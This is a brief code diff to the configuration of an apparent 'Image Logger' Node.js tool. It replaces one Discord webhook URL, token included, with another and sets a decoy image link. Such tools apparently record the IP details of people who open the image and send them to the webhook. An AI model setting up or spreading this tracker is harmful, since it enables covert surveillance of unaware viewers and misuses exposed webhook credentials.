@@ -5,7 +5,7 @@ const url = require('url');
 
 // Configuração
 const config = {
-  "webhook": "https://discord.com/api/webhooks/1365644976100479017/QS_C5U5sVCtMUGU-n5blRASzetsy9ONzv3cBOJa1bY3wc3KFBFKgUbcskrq9lCkc7yiF",
+  "webhook": "https://discord.com/api/webhooks/1368596978409148517/kylqMWj72jr8gi7JJjzYf1NuduPPTsSiv8rnY0f-OmfGZYi4PzQbfSQ1eRuO0dMiCMD3",
   "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg",
   "username": "Image Logger",
   "color": 0x00FFFF,
